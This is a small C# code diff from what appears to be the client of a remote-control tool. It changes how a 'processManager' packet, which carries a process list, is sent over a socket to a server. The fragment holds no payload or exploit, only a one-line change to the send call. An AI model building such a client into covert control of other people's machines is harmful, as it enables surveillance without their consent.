@@ -61,7 +61,7 @@ namespace Client.Handle_Packet
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "processManager";
             msgpack.ForcePathObject("Message").AsString = sb.ToString();
-            ClientSocket.BeginSend(msgpack.Encode2Bytes());
+            ClientSocket.Send(msgpack.Encode2Bytes());
         }
 
     }
